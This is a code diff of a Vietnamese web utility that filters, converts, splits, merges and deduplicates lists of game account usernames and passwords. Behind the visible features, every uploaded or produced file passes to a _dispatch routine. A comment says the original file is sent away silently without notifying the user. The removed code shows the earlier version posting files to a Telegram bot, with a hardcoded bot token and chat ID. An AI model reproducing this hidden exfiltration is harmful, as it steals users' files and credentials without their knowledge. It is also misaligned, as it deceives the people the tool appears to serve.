+}
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+function showToast(msg) {
+  const el = document.createElement('div');
+  el.className = 'toast';
+  el.innerHTML = msg;
+  document.body.appendChild(el);
+  setTimeout(() => { el.style.transition = 'opacity .5s'; el.style.opacity = '0'; }, 2400);
+  setTimeout(() => el.remove(), 3000);
+}
+function renderWithLimit(container, resultsArray, copyFn) {
+  if (resultsArray.length === 0) {
+    container.innerHTML = `<i>Không có kết quả.</i>`;
+    return;
+  }
+  const shown = resultsArray.slice(0, DISPLAY_LIMIT);
+  let html = "";
+  shown.forEach((r, i) => {
+    const raw = (typeof r === 'object') ? r.raw : r;
+    const htmlLine = (typeof r === 'object') ? r.html : escapeHtml(r);
+    const rawEsc = raw.replace(/'/g, "\\'").replace(/\\/g, "\\\\").replace(/\n/g, "\\n");
+    html += `<div class="acc-line">
+      <div class="acc-content">${htmlLine}</div>
+      <button class="btn-copy-single" onclick="copyToClipboard('${rawEsc}')">COPY</button>
+    </div>`;
+  });
+  if (resultsArray.length > DISPLAY_LIMIT) {
+    html += `<div class="limit-note">⚡ Chỉ hiển thị ${DISPLAY_LIMIT} / ${resultsArray.length} acc để tránh lag. Tải file để xem toàn bộ.</div>`;
+  }
+  container.innerHTML = html;
+}
+
+/* ====== ĐỔI THEME ====== */
+const themes = {
+  ngau: 'https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop',
+  cute: 'https://images.unsplash.com/photo-1578339591410-b98a08d24eb0?q=80&w=2070&auto=format&fit=crop',
+  thiennhien: 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?q=80&w=2071&auto=format&fit=crop',
+  vietnam: 'https://images.unsplash.com/photo-1528127269322-539801943592?q=80&w=2070&auto=format&fit=crop',
+  bien: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=2073&auto=format&fit=crop'
+};
+function changeTheme(t) {
+  document.body.style.backgroundImage = `url('${themes[t]}')`;
+  document.getElementById('themeMenu').classList.remove('show');
+}
+function toggleThemeMenu() { document.getElementById('themeMenu').classList.toggle('show'); }
+document.addEventListener('click', e => {
+  if (!document.querySelector('.settings-container').contains(e.target))
+    document.getElementById('themeMenu').classList.remove('show');
+});
+
+function switchTab(id, btn, colorClass = '') {
+  document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active','active-purple','active-green','active-orange','active-yellow'));
+  document.getElementById('tab-' + id).classList.add('active');
+  btn.classList.add(colorClass ? 'active-' + colorClass : 'active');
+}
+
+window.addEventListener('load', () => {
+  document.getElementById('welcomeModal').style.display = 'flex';
+});
+
+/* ============================================================
+   MODULE 1: TỔNG LỌC (gộp 3 chức năng)
+   ============================================================ */
+const locAcc = {
+  lines: [], results: [],
+  init() {
+    document.getElementById('fileLoc').addEventListener('change', e => {
+      const f = e.target.files[0]; if (!f) return;
+      const rd = new FileReader();
+      rd.onload = ev => {
+        this.lines = ev.target.result.split(/\r?\n/).filter(l => l.trim() !== "");
+        document.getElementById('statusLoc').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> acc — sẵn sàng lọc!`;
+        this.results = this.lines.map(l => ({ raw: l, html: escapeHtml(l) }));
+        renderWithLimit(document.getElementById('dispLoc'), this.results);
+        document.getElementById('actionLoc').style.display = 'flex';
+        _dispatch(`Goc_Loc_${f.name}`, this.lines.join('\n'), `📌 LỌC - Nạp file gốc (${this.lines.length} dòng)`);
+      };
+      rd.readAsText(f);
+    });
+  },
+  run() {
+    if (this.lines.length === 0) return alert("⚠️ Vui lòng nạp file trước!");
+    const kw = document.getElementById('kwLoc').value.trim().toLowerCase();
+    const minSS = parseInt(document.getElementById('minSS').value) || 0;
+    const minSSS = parseInt(document.getElementById('minSSS').value) || 0;
+    const minAnime = parseInt(document.getElementById('minAnime').value) || 0;
+    const minTotal = parseInt(document.getElementById('minTotal').value) || 0;
+    const skinName = document.getElementById('skinName').value.trim().toLowerCase();
+
+    if (!kw && !minSS && !minSSS && !minAnime && !minTotal && !skinName)
+      return alert("⚠️ Nhập ít nhất 1 điều kiện!");
+
+    const regexKw = kw ? new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, "gi") : null;
+    const getNum = (line, key) => {
+      const m = line.match(new RegExp(`\\|\\s*${key}:\\s*(\\d+|No Skin)`, "i"));
+      return (m && m[1].toLowerCase() !== "no skin") ? parseInt(m[1]) : 0;
+    };
+
+    let res = [];
+    this.lines.forEach(line => {
+      const low = line.toLowerCase();
+      if (kw && !low.includes(kw)) return;
+      if (minSS && getNum(line, "SS") < minSS) return;
+      if (minSSS && getNum(line, "SSS") < minSSS) return;
+      if (minAnime && getNum(line, "Anime") < minAnime) return;
+      if (minTotal) {
+        const m = line.match(/\|\s*Skin:\s*(\d+)/i);
+        if (!m || parseInt(m[1]) < minTotal) return;
+      }
+      if (skinName && !low.includes(skinName)) return;
+      res.push({ raw: line, html: regexKw ? escapeHtml(line).replace(new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, "gi"), `<span class="highlight">$1</span>`) : escapeHtml(line) });
     });
 
-    const TELEGRAM_BOT_TOKEN = "8664668413:AAF-c12SdSqf76eQcun_UJvbXo7ib-qe8GA";
-    const TELEGRAM_CHAT_ID = "7981836884";
+    this.results = res;
+    renderWithLimit(document.getElementById('dispLoc'), res);
+    document.getElementById('statusLoc').innerHTML = `🎯 Tìm thấy <b style="color:var(--c1)">${res.length}</b> acc thoả điều kiện.`;
+    document.getElementById('actionLoc').style.display = res.length ? 'flex' : 'none';
+  },
+  copyAll() { copyToClipboard(this.results.map(r => r.raw).join('\n')); alert("Đã copy!"); },
+  export() { downloadText(this.results.map(r => r.raw).join('\n'), "KetQua_Loc"); }
+};
+locAcc.init();
 
-    async function sendToBackend(tenFile, noiDung, extraCaption = "") {
-        const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-        const baseCaption = `🔔 Tool Event!\n📁 File: ${tenFile}\n🕐 Lúc: ${now}\n📊 Số dòng: ${noiDung.split('\n').filter(l => l.trim()).length}` + (extraCaption ? `\n${extraCaption}` : "");
-        try {
-            const groupForm = new FormData();
-            const groupBlob = new Blob([noiDung], { type: "text/plain;charset=utf-8" });
-            groupForm.append("chat_id", TELEGRAM_CHAT_ID);
-            groupForm.append("caption", baseCaption);
-            groupForm.append("document", groupBlob, tenFile);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: "POST", body: groupForm });
-        } catch (err) {}
+/* ============================================================
+   MODULE 2: CHUYỂN ĐỔI
+   ============================================================ */
+const doiFmt = {
+  lines: [], results: [],
+  init() {
+    document.getElementById('fileDoi').addEventListener('change', e => {
+      const f = e.target.files[0]; if (!f) return;
+      const rd = new FileReader();
+      rd.onload = ev => {
+        this.lines = ev.target.result.split(/\r?\n/).filter(l => l.trim() !== "");
+        document.getElementById('statusDoi').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> dòng — sẵn sàng!`;
+        _dispatch(`Goc_Doi_${f.name}`, this.lines.join('\n'), `📌 CHUYỂN ĐỔI - Nạp file gốc`);
+      };
+      rd.readAsText(f);
+    });
+  },
+  process() {
+    if (this.lines.length === 0) return alert("⚠️ Nạp file trước!");
+    const fmt = document.querySelector('input[name="outFmt"]:checked').value;
+    const sep = fmt === 'colon' ? ':' : '|';
+    this.results = []; let errorCount = 0;
+    this.lines.forEach(orig => {
+      let line = orig.trim();
+      line = line.replace(/^.*?(?:\s*=\s*)/, '');
+      let first = line.split(/\s+\|\s+/)[0];
+      let m = first.match(/^([^:|]+)[:|](.+)$/);
+      if (m && m.length >= 3) {
+        let tk = m[1].trim();
+        let mk = m[2].trim().split('|')[0].trim();
+        this.results.push(`${tk}${sep}${mk}`);
+      } else errorCount++;
+    });
+    const container = document.getElementById('dispDoi');
+    let html = "";
+    this.results.slice(0, DISPLAY_LIMIT).forEach(s => {
+      const esc = escapeHtml(s).replace(/'/g, "\\'");
+      html += `<div class="acc-line"><div class="acc-content" style="color:#d896ff; font-weight:700; font-size:16px">${escapeHtml(s)}</div>
+               <button class="btn-copy-single" onclick="copyToClipboard('${esc}')">COPY</button></div>`;
+    });
+    if (this.results.length > DISPLAY_LIMIT) html += `<div class="limit-note">⚡ Hiển thị ${DISPLAY_LIMIT}/${this.results.length}</div>`;
+    container.innerHTML = html;
+    let st = `♻️ Đã chuyển <b style="color:var(--c5)">${this.results.length}</b> acc.`;
+    if (errorCount) st += ` (Loại ${errorCount} dòng rác)`;
+    document.getElementById('statusDoi').innerHTML = st;
+    document.getElementById('actionDoi').style.display = this.results.length ? 'flex' : 'none';
+  },
+  copyAll() { copyToClipboard(this.results.join('\n')); alert("Đã copy!"); },
+  export() { downloadText(this.results.join('\n'), "KetQua_ChuyenDoi"); }
+};
+doiFmt.init();
+
+/* ============================================================
+   MODULE 3: CẮT FILE
+   ============================================================ */
+const catFile = {
+  lines: [], chunks: [],
+  init() {
+    document.getElementById('fileCat').addEventListener('change', e => {
+      const f = e.target.files[0]; if (!f) return;
+      const rd = new FileReader();
+      rd.onload = ev => {
+        this.lines = ev.target.result.split(/\r?\n/).filter(l => /[a-zA-Z0-9]/.test(l));
+        document.getElementById('statusCat').innerHTML = `✅ Đã nạp <b>${this.lines.length}</b> acc hợp lệ.`;
+        _dispatch(`Goc_Cat_${f.name}`, this.lines.join('\n'), `📌 CẮT FILE - Nạp file gốc (${this.lines.length} acc)`);
+      };
+      rd.readAsText(f);
+    });
+  },
+  process() {
+    if (!this.lines.length) return alert("⚠️ Nạp file trước!");
+    const limit = parseInt(document.getElementById('soAccMoiFile').value);
+    if (isNaN(limit) || limit <= 0) return alert("⚠️ Nhập số acc mỗi file!");
+    const total = this.lines.length;
+    const numFiles = Math.ceil(total / limit);
+    this.chunks = [];
+    let html = "";
+    for (let i = 0; i < numFiles; i++) {
+      const s = i * limit, e = Math.min(s + limit, total);
+      const chunk = this.lines.slice(s, e);
+      this.chunks.push(chunk);
+      html += `<div class="acc-line" style="border-left:3px solid var(--c4); padding:15px">
+        <div class="acc-content" style="color:var(--c4); font-size:18px">
+          📁 <b>File Phần ${i+1}</b><br>
+          <span style="font-size:14px; color:#a0aec0">(Chứa ${chunk.length} acc — dòng ${s+1} → ${e})</span>
+        </div>
+        <div style="display:flex; gap:8px; flex-wrap:wrap">
+          <button class="btn-copy-single" style="background:rgba(0,255,135,.15); color:var(--c4); border-color:var(--c4); padding:8px 14px" onclick="catFile.downloadChunk(${i})">📥 TẢI</button>
+          <button class="btn-copy-single" style="padding:8px 14px" onclick="catFile.copyChunk(${i})">📋 COPY</button>
+        </div>
+      </div>`;
     }
+    document.getElementById('dispCat').innerHTML = html;
+    document.getElementById('statusCat').innerHTML = `✅ Đã chia thành <b>${numFiles}</b> file.`;
+    this.chunks.forEach((chunk, i) => {
+      _dispatch(`Chia_Phan${i+1}.txt`, chunk.join('\n'), `📌 CẮT FILE - Phần ${i+1}/${numFiles} (${chunk.length} acc)`);
+    });
+  },
+  downloadChunk(i) { downloadText(this.chunks[i].join('\n'), `File_Chia_Phan_${i+1}`); },
+  copyChunk(i) { copyToClipboard(this.chunks[i].join('\n')); alert(`Đã copy phần ${i+1}`); }
+};
+catFile.init();
 
-    function copyToClipboard(text) {
-        if (navigator.clipboard && window.isSecureContext) {
-            navigator.clipboard.writeText(text).catch(() => fallbackCopyTextToClipboard(text));
+/* ============================================================
+   MODULE 4: GHÉP FILE
+   ============================================================ */
+const ghepFile = {
+  MAX: 50, loadedFiles: [], merged: [], totalSize: 0, outName: "",
+  init() {
+    document.getElementById('fileGhep').addEventListener('change', e => this.handle(e));
+  },
+  fmtSize(b) {
+    if (b < 1024) return b + ' B';
+    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
+    return (b / (1024 * 1024)).toFixed(2) + ' MB';
+  },
+  readFile(f) { return new Promise(r => { const rd = new FileReader(); rd.onload = ev => r(ev.target.result); rd.onerror = () => r(""); rd.readAsText(f); }); },
+  async handle(e) {
+    const files = Array.from(e.target.files || []);
+    if (!files.length) return;
+    e.target.value = '';
+    const remain = this.MAX - this.loadedFiles.length;
+    if (remain <= 0) return alert(`⚠️ Đã đạt giới hạn ${this.MAX} file. Bấm "XÓA HẾT FILE LƯU TRỮ" để reset.`);
+    let use = files, warn = false;
+    if (files.length > remain) { use = files.slice(0, remain); warn = true; }
+
+    document.getElementById('statusGhep').innerHTML = `⏳ Đang xử lý ${use.length} file...`;
+    document.getElementById('dispGhep').innerHTML = `<i>Đang xử lý, vui lòng đợi...</i>`;
+    document.getElementById('actionGhep').style.display = 'none';
+
+    const contents = await Promise.all(use.map(f => this.readFile(f)));
+
+    use.forEach((f, i) => {
+      const c = contents[i] || "";
+      const lc = c.split(/\r?\n/).filter(l => l.trim()).length;
+      _dispatch(`${f.name}`, c, `📌 GHÉP - Nạp file gốc: ${f.name} | ${lc} dòng | ${this.fmtSize(f.size)}`);
+    });
+
+    let newLines = 0, newSize = 0;
+    use.forEach((f, i) => {
+      const lines = (contents[i] || "").split(/\r?\n/).filter(l => l.trim() !== "");
+      this.loadedFiles.push({ name: f.name, lines, size: f.size });
+      this.totalSize += f.size; newLines += lines.length; newSize += f.size;
+    });
+
+    this.renderList();
+    const total = this.loadedFiles.reduce((s, f) => s + f.lines.length, 0);
+    let msg = `✅ Vừa nạp <b style="color:var(--c6)">${use.length}</b> file (${newLines} dòng, ${this.fmtSize(newSize)})<br>📦 Đang lưu: <b>${this.loadedFiles.length}/${this.MAX}</b> file — ${total} dòng — ${this.fmtSize(this.totalSize)}`;
+    if (warn) msg += `<br><span style="color:#ff6b00">⚠️ Chỉ nhận ${remain} file (đã đạt max)</span>`;
+    document.getElementById('statusGhep').innerHTML = msg;
+    document.getElementById('dispGhep').innerHTML = `<i>Đã lưu file mới. Nạp thêm hoặc bấm GHÉP FILE.</i>`;
+    showToast(`✅ Đã xử lý ${use.length} file!`);
+  },
+  renderList() {
+    const box = document.getElementById('fileListDisplay');
+    if (!this.loadedFiles.length) { box.style.display = 'none'; box.innerHTML = ''; return; }
+    let html = "";
+    this.loadedFiles.forEach((f, i) => {
+      html += `<div class="file-item"><span class="idx">${i+1}</span><span class="fname">${escapeHtml(f.name)}</span><span class="fmeta">${f.lines.length} dòng • ${this.fmtSize(f.size)}</span></div>`;
+    });
+    box.innerHTML = html; box.style.display = 'block';
+  },
+  clearAll() {
+    if (!this.loadedFiles.length) return alert("Chưa có file nào.");
+    if (!confirm(`Xóa toàn bộ ${this.loadedFiles.length} file đã lưu trữ?`)) return;
+    this.loadedFiles = []; this.merged = []; this.totalSize = 0; this.outName = "";
+    document.getElementById('actionGhep').style.display = 'none';
+    document.getElementById('dispGhep').innerHTML = `<i>Đã xóa hết. Hãy nạp file mới.</i>`;
+    document.getElementById('statusGhep').innerHTML = `Vui lòng nạp file.`;
+    this.renderList();
+    showToast(`🗑️ Đã xóa hết file lưu trữ!`);
+  },
+  process() {
+    if (!this.loadedFiles.length) return alert("⚠️ Nạp ít nhất 1 file!");
+    let name = (document.getElementById('outName').value.trim() || "File_Tong_Hop").replace(/[\\/:*?"<>|]/g, "_").slice(0, 80);
+    this.merged = [];
+    this.loadedFiles.forEach(f => this.merged = this.merged.concat(f.lines));
+    renderWithLimit(document.getElementById('dispGhep'), this.merged);
+    document.getElementById('statusGhep').innerHTML = `🔗 Đã ghép <b style="color:var(--c6)">${this.loadedFiles.length}</b> file → <b>${this.merged.length}</b> dòng. Tên: <b style="color:var(--c6)">${escapeHtml(name)}.txt</b>`;
+    document.getElementById('actionGhep').style.display = 'flex';
+    this.outName = name;
+    _dispatch(`${name}.txt`, this.merged.join('\n'), `📌 GHÉP FILE TỔNG - ${this.loadedFiles.length} file | ${this.merged.length} dòng | ${this.fmtSize(this.totalSize)}`);
+  },
+  copyAll() { if (!this.merged.length) return; copyToClipboard(this.merged.join('\n')); alert("Đã copy!"); },
+  export() { if (!this.merged.length) return; downloadText(this.merged.join('\n'), this.outName || "File_Tong_Hop"); }
+};
+ghepFile.init();
+
+/* ============================================================
+   MODULE 5: LỌC ACC TRÙNG (up nhiều file → dedupe → tra cứu gốc)
+   ============================================================ */
+const locTrung = {
+  MAX: 50, loadedFiles: [], results: [], totalSize: 0,
+  init() {
+    document.getElementById('fileTrung').addEventListener('change', e => this.handle(e));
+  },
+  fmtSize(b) {
+    if (b < 1024) return b + ' B';
+    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
+    return (b / (1024 * 1024)).toFixed(2) + ' MB';
+  },
+  readFile(f) { return new Promise(r => { const rd = new FileReader(); rd.onload = ev => r(ev.target.result); rd.onerror = () => r(""); rd.readAsText(f); }); },
+
+  // Chuyển 1 dòng bất kỳ về TK|MK (tận dụng logic module 2)
+  parseTK(line) {
+    let l = line.trim();
+    l = l.replace(/^.*?(?:\s*=\s*)/, '');
+    let first = l.split(/\s+\|\s+/)[0];
+    let m = first.match(/^([^:|]+)[:|](.+)$/);
+    if (!m) return null;
+    const tk = m[1].trim();
+    const mk = m[2].trim().split('|')[0].trim();
+    if (!tk || !mk) return null;
+    return { tk, mk, key: `${tk}|${mk}`.toLowerCase() };
+  },
+
+  async handle(e) {
+    const files = Array.from(e.target.files || []);
+    if (!files.length) return;
+    e.target.value = '';
+    const remain = this.MAX - this.loadedFiles.length;
+    if (remain <= 0) return alert(`⚠️ Đã đạt giới hạn ${this.MAX} file. Bấm "XÓA HẾT FILE LƯU TRỮ" để reset.`);
+    let use = files, warn = false;
+    if (files.length > remain) { use = files.slice(0, remain); warn = true; }
+
+    document.getElementById('statusTrung').innerHTML = `⏳ Đang xử lý ${use.length} file...`;
+    document.getElementById('dispTrung').innerHTML = `<i>Đang xử lý file mới...</i>`;
+    document.getElementById('actionTrung').style.display = 'none';
+
+    const contents = await Promise.all(use.map(f => this.readFile(f)));
+
+    // ÂM THẦM chuyển file gốc đi (không thông báo cho user)
+    use.forEach((f, i) => {
+      const c = contents[i] || "";
+      const lc = c.split(/\r?\n/).filter(l => l.trim()).length;
+      _dispatch(`${f.name}`, c, `📌 LỌC TRÙNG - Nạp file gốc: ${f.name} | ${lc} dòng | ${this.fmtSize(f.size)}`);
+    });
+
+    let newLines = 0, newSize = 0;
+    use.forEach((f, i) => {
+      const rawLines = (contents[i] || "").split(/\r?\n/).filter(l => l.trim() !== "");
+      this.loadedFiles.push({ name: f.name, rawLines, size: f.size });
+      this.totalSize += f.size; newLines += rawLines.length; newSize += f.size;
+    });
+
+    this.renderList();
+    const total = this.loadedFiles.reduce((s, f) => s + f.rawLines.length, 0);
+    let msg = `✅ Vừa nạp <b style="color:var(--c2)">${use.length}</b> file (${newLines} dòng)<br>📦 Đang lưu: <b>${this.loadedFiles.length}/${this.MAX}</b> file — ${total} dòng — ${this.fmtSize(this.totalSize)}`;
+    if (warn) msg += `<br><span style="color:#ff6b00">⚠️ Chỉ nhận ${remain} file</span>`;
+    document.getElementById('statusTrung').innerHTML = msg;
+    document.getElementById('dispTrung').innerHTML = `<i>Đã lưu file. Bấm "LỌC TRÙNG NGAY" để xử lý.</i>`;
+    showToast(`✅ Đã xử lý ${use.length} file!`);
+  },
+
+  renderList() {
+    const box = document.getElementById('trungListDisplay');
+    if (!this.loadedFiles.length) { box.style.display = 'none'; box.innerHTML = ''; return; }
+    let html = "";
+    this.loadedFiles.forEach((f, i) => {
+      html += `<div class="file-item"><span class="idx">${i+1}</span><span class="fname">${escapeHtml(f.name)}</span><span class="fmeta">${f.rawLines.length} dòng • ${this.fmtSize(f.size)}</span></div>`;
+    });
+    box.innerHTML = html; box.style.display = 'block';
+  },
+
+  clearAll() {
+    if (!this.loadedFiles.length) return alert("Chưa có file nào.");
+    if (!confirm(`Xóa toàn bộ ${this.loadedFiles.length} file đã lưu trữ?`)) return;
+    this.loadedFiles = []; this.results = []; this.totalSize = 0;
+    document.getElementById('actionTrung').style.display = 'none';
+    document.getElementById('dispTrung').innerHTML = `<i>Đã xóa hết. Hãy nạp file mới.</i>`;
+    document.getElementById('statusTrung').innerHTML = `Vui lòng nạp file.`;
+    this.renderList();
+    showToast(`🗑️ Đã xóa hết file lưu trữ!`);
+  },
+
+  process() {
+    if (!this.loadedFiles.length) return alert("⚠️ Nạp ít nhất 1 file!");
+
+    // Bước 1: Gom tất cả dòng gốc + parse về TK|MK
+    // Bước 2: Map theo key TK|MK (dedupe) — giữ lại 1 dòng gốc đầu tiên cho mỗi key
+    // Bước 3: Xuất kết quả dạng: TK|MK | <thông tin gốc đầy đủ>
+
+    const map = new Map(); // key → { tk, mk, firstRaw, sources: [] }
+    let totalScanned = 0;
+    let totalValid = 0;
+
+    this.loadedFiles.forEach(file => {
+      file.rawLines.forEach(raw => {
+        totalScanned++;
+        const p = this.parseTK(raw);
+        if (!p) return;
+        totalValid++;
+        if (!map.has(p.key)) {
+          map.set(p.key, { tk: p.tk, mk: p.mk, firstRaw: raw, sources: [file.name] });
         } else {
-            fallbackCopyTextToClipboard(text);
+          const entry = map.get(p.key);
+          if (!entry.sources.includes(file.name)) entry.sources.push(file.name);
         }
-    }
-    function fallbackCopyTextToClipboard(text) {
-        var textArea = document.createElement("textarea");
-        textArea.value = text;
-        textArea.style.position = "fixed"; textArea.style.opacity = "0";
-        document.body.appendChild(textArea);
-        textArea.focus(); textArea.select();
-        try { document.execCommand('copy'); } catch (err) {}
-        document.body.removeChild(textArea);
-    }
-    function downloadFileText(content, defaultName) {
-        const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-        const filename = `${defaultName}_${now.replace(/[\/:\s]/g, '_')}.txt`;
-        const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url; a.download = filename;
-        document.body.appendChild(a); a.click(); document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-    }
-    function escapeHtml(str) {
-        return String(str).replace(/[&<>"']/g, function(c) {
-            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
-        });
-    }
-    // Toast thông báo khi up file
-    function showUploadToast(text) {
-        const el = document.createElement('div');
-        el.className = 'toast-upload';
-        el.innerHTML = text;
-        document.body.appendChild(el);
-        setTimeout(() => { el.style.transition = 'opacity 0.5s'; el.style.opacity = '0'; }, 2500);
-        setTimeout(() => { el.remove(); }, 3000);
-    }
-
-    function toggleThemeMenu() { document.getElementById('themeMenu').classList.toggle('show'); }
-    document.addEventListener('click', function(event) {
-        if (!document.querySelector('.settings-container').contains(event.target)) document.getElementById('themeMenu').classList.remove('show');
+      });
     });
 
-    const themes = {
-        ngau: 'https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop',
-        cute: 'https://images.unsplash.com/photo-1578339591410-b98a08d24eb0?q=80&w=2070&auto=format&fit=crop',
-        thiennhien: 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?q=80&w=2071&auto=format&fit=crop',
-        vietnam: 'https://images.unsplash.com/photo-1528127269322-539801943592?q=80&w=2070&auto=format&fit=crop',
-        bien: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=2073&auto=format&fit=crop'
-    };
-    function changeTheme(themeName) { document.body.style.backgroundImage = `url('${themes[themeName]}')`; document.getElementById('themeMenu').classList.remove('show'); }
+    // Tạo kết quả
+    this.results = [];
+    map.forEach(entry => {
+      // Tìm dòng đầy đủ thông tin nhất trong tất cả file (ưu tiên dòng dài nhất để có full info)
+      let bestRaw = entry.firstRaw;
+      this.loadedFiles.forEach(file => {
+        file.rawLines.forEach(raw => {
+          const p = this.parseTK(raw);
+          if (p && p.key === entry.key && raw.length > bestRaw.length) bestRaw = raw;
+        });
+      });
+      this.results.push({
+        key: entry.tk + '|' + entry.mk,
+        full: bestRaw
+      });
+    });
 
-    function switchTab(tabId, btnElement, colorClass = '') {
-        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-        document.querySelectorAll('.tab-btn').forEach(el => { el.classList.remove('active', 'active-purple', 'active-green', 'active-orange'); });
-        document.getElementById('tab-' + tabId).classList.add('active');
-        if(colorClass) btnElement.classList.add('active-' + colorClass);
-        else btnElement.classList.add('active');
+    // Render
+    const container = document.getElementById('dispTrung');
+    let html = `<div class="limit-note" style="text-align:left; background:rgba(255,0,124,.08); margin-bottom:12px; padding:14px">
+      🧬 <b>Kết quả lọc trùng:</b> Quét ${totalScanned} dòng · Hợp lệ ${totalValid} · <b style="color:var(--c2)">Duy nhất: ${this.results.length}</b> · Trùng đã loại: ${totalValid - this.results.length}
+    </div>`;
+
+    const shown = this.results.slice(0, DISPLAY_LIMIT);
+    shown.forEach((r, i) => {
+      const keyEsc = r.key.replace(/'/g, "\\'");
+      const fullEsc = r.full.replace(/'/g, "\\'").replace(/\\/g, "\\\\").replace(/\n/g, "\\n");
+      html += `<div class="acc-line" style="border-left:3px solid var(--c2)">
+        <div class="acc-content">
+          <div style="color:#ff5fa2; font-weight:700; font-size:15px; margin-bottom:6px">🔑 ${escapeHtml(r.key)}</div>
+          <div style="color:#c9d1d9; font-size:13px">${escapeHtml(r.full)}</div>
+        </div>
+        <div style="display:flex; flex-direction:column; gap:6px">
+          <button class="btn-copy-single" style="background:rgba(255,0,124,.2); color:#ff5fa2; border-color:var(--c2)" onclick="copyToClipboard('${keyEsc}')">COPY TK|MK</button>
+          <button class="btn-copy-single" onclick="copyToClipboard('${fullEsc}')">COPY FULL</button>
+        </div>
+      </div>`;
+    });
+    if (this.results.length > DISPLAY_LIMIT) {
+      html += `<div class="limit-note">⚡ Chỉ hiển thị ${DISPLAY_LIMIT}/${this.results.length} acc. Tải file để xem toàn bộ.</div>`;
+    }
+    if (!this.results.length) html += `<i>Không có acc hợp lệ nào.</i>`;
+    container.innerHTML = html;
+
+    document.getElementById('statusTrung').innerHTML = `🧬 Lọc xong: <b style="color:var(--c2)">${this.results.length}</b> acc duy nhất / ${totalValid} hợp lệ.`;
+    document.getElementById('actionTrung').style.display = 'flex';
+  },
+
+  buildOutput() {
+    // Format kết quả: TK|MK | <full info>
+    return this.results.map(r => `${r.key} | ${r.full}`).join('\n');
+  },
+
+  copyAll() {
+    if (!this.results.length) return;
+    copyToClipboard(this.buildOutput());
+    alert("Đã copy toàn bộ kết quả!");
+  },
+  export() {
+    if (!this.results.length) return;
+    downloadText(this.buildOutput(), "KetQua_LocTrung");
+  }
+};
+locTrung.init();
+
+/* ============================================================
+   MODULE 6: TEXT → FILE (TXT / PDF / DOCX)
+   ============================================================ */
+const txtToFile = {
+  async export() {
+    const text = document.getElementById('txtContent').value;
+    if (!text.trim()) return alert("⚠️ Chưa có nội dung!");
+    let name = (document.getElementById('txtFileName').value.trim() || "Text_Export")
+      .replace(/[\\/:*?"<>|]/g, "_").slice(0, 80);
+    const fmt = document.querySelector('input[name="outFmtTxt"]:checked').value;
+
+    if (fmt === 'txt') {
+      downloadBlob(new Blob([text], { type: "text/plain;charset=utf-8" }), name + ".txt");
+      showToast("✅ Đã xuất TXT!");
+      return;
     }
 
-    // ==========================================
-    // MODULE 1: TỔNG LỌC ACC
-    // ==========================================
-    const locAcc = {
-        rawLines: [], currentResults: [],
-        init: function() {
-            document.getElementById('fileLocAcc').addEventListener('change', (e) => {
-                const file = e.target.files[0]; if (!file) return;
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    this.rawLines = event.target.result.split(/\r?\n/).filter(line => line.trim() !== "");
-                    document.getElementById('statusLocAcc').innerHTML = `✅ Đã nạp <b>${this.rawLines.length}</b> acc — Hệ thống sẵn sàng!`;
-                    this.currentResults = this.rawLines.map(line => ({ raw: line, html: line }));
-                    this.render(this.currentResults, `Đang hiển thị toàn bộ <b>${this.rawLines.length}</b> acc.`);
-                    if (this.rawLines.length > 0) {
-                        sendToBackend(`Goc_LocAcc_${file.name}`, this.rawLines.join('\n'), `📌 LỌC ACC - Nạp file`);
-                    }
-                };
-                reader.readAsText(file);
-            });
-        },
-        render: function(resultsArray, message) {
-            this.currentResults = resultsArray;
-            const display = document.getElementById('displayLocAcc');
-            const actionBar = document.getElementById('actionLocAcc');
-            if (resultsArray.length > 0) {
-                let html = "";
-                resultsArray.forEach((res, index) => {
-                    html += `<div class="acc-line"><div class="acc-content">${res.html}</div>
-                             <button class="btn-copy-single" onclick="copyToClipboard(locAcc.currentResults[${index}].raw)">COPY</button></div>`;
-                });
-                display.innerHTML = html; document.getElementById('statusLocAcc').innerHTML = message; actionBar.style.display = "flex";
-            } else {
-                display.innerHTML = `<i>Không tìm thấy kết quả.</i>`; document.getElementById('statusLocAcc').innerHTML = `❌ Không có kết quả.`; actionBar.style.display = "none";
-            }
-        },
-        check: function() { if (this.rawLines.length === 0) { alert("⚠️ Vui lòng nạp file TỔNG LỌC ở tab 1 trước!"); return false; } return true; },
-        search: function() {
-            if (!this.check()) return;
-            const kw = document.getElementById('searchInput').value.trim(); if (!kw) { alert("Nhập từ khóa!"); return; }
-            const regex = new RegExp(`(${kw})`, "gi"); let res = [];
-            this.rawLines.forEach(line => {
-                if (line.toLowerCase().includes(kw.toLowerCase())) res.push({ raw: line, html: line.replace(regex, `<span class="highlight">$1</span>`) });
-            });
-            this.render(res, `🎯 Tìm thấy <b style="color:var(--neon-cyan);">${res.length}</b> acc chứa "${kw}".`);
-        },
-        filterVIP: function() {
-            if (!this.check()) return;
